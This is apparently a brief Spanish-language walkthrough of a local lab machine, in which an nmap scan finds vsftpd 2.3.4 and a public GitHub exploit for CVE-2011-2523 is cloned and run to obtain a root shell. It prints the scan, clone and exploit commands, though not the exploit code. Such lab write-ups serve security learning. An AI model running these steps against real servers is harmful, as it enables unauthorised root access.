## Hacemos un nmap para escanear los puertos abiertos de la maquina

```
nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

[![nmap.png](https://i.postimg.cc/PqgKQ4R7/nmap.png)](https://postimg.cc/qtG8k80c)
#### vemos un puerto 21 FTP con la version ***vsftpd 2.3.4*** y un puerto 80 la version de ftp es vulnerable asi que buscamos en github y encontramos este proyecto:

```
https://github.com/nobodyatall648/CVE-2011-2523

```
[![vsftpd.png](https://i.postimg.cc/bNRYnYJX/vsftpd.png)](https://postimg.cc/QHHrG31S)
#### copiamos el proyecto con git

```
git clone https://github.com/nobodyatall648/CVE-2011-2523.git
```

[![git.png](https://i.postimg.cc/qMtXM7xL/git.png)](https://postimg.cc/SJhzgk52)
#### una vez copiado lo ejecutamos con:

```
sudo python3 vsftpd_2.3.4_exploit.py 172.17.0.2
```

[![root.png](https://i.postimg.cc/D0nPBVWM/root.png)](https://postimg.cc/hzZmt51L)
#### y somos root

